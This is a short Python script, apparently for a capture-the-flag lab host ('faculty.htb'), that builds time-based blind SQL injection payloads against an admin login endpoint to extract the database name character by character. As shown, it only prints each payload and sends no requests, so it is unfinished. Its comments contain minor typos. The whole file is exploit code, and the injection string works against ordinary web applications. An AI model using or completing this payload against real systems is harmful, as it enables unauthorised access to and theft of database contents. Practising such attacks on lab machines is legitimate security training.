#!/usr/bin/python3
# >>> string.ascii.lowercase
# >>> string.ascii.upppercase
# >>> string.digits
# >>> string.puncuation
# >>> string.printable
from pwn import *
import requests, time, sys, pdb, string, signal

def def_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

# CTRL+c
signal.signal(signal.SIGINT, def_handler)

#time.sleep(10)
# Global Variables
characters = string.ascii_lowercase + string.digits + "-_"
login_url = "http://faculty.htb/admin/ajax.php?action=login"

def sqli():
    for position in range(1, 20):
        for character in characters:
            post_data = {
                'username': "admin' and if (substr(database(),%d,1)='%s',sleep(5),1)-- -" % (position,character),
                'password': 'admin'
            }

            print(post_data['username'])




if __name__ == '__main__':
    sqli()